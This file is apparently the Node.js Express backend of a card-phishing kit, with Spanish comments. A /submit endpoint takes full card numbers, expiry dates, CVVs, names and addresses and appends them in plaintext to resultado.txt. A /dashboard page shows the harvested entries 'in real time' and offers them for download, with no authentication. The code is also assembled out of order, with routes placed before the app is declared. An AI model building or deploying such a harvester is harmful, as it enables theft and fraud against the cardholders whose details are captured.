// Endpoint para mostrar resultados en tiempo real
app.get('/dashboard', (req, res) => {
  const filePath = path.join(__dirname, 'resultado.txt');
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).send('<h2>Error al leer resultados.</h2>');
    }
    res.send(`
      <html>
        <head>
          <title>Resultados en tiempo real</title>
          <meta charset="UTF-8">
          <style>
            body { font-family: Arial, sans-serif; background: #f4f7fa; padding: 30px; }
            pre { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
            h2 { color: #003366; }
            .download { margin-top: 20px; }
          </style>
        </head>
        <body>
          <h2>Resultados en tiempo real</h2>
          <pre>${data.replace(/</g, '&lt;')}</pre>
          <div class="download">
            <a href="/descargar-resultado" download>Descargar resultado.txt</a>
          </div>
        </body>
      </html>
    `);
  });
});

// Endpoint para descargar resultado.txt
app.get('/descargar-resultado', (req, res) => {
  const filePath = path.join(__dirname, 'resultado.txt');
  res.download(filePath, 'resultado.txt');
});
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

app.post('/submit', (req, res) => {
  const { cardnumber, expmonth, expyear, cvv, firstname, lastname, address } = req.body;
  const entry = `Card Number: ${cardnumber}\nMonth: ${expmonth}\nYear: ${expyear}\nCVV: ${cvv}\nName: ${firstname} ${lastname}\nAddress: ${address}\n---\n`;
  const filePath = path.join(__dirname, 'resultado.txt');
  fs.appendFile(filePath, entry, (err) => {
    if (err) {
      return res.status(500).json({ message: 'Error saving data.' });
    }
    res.status(200).json({ message: 'Data saved.' });
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
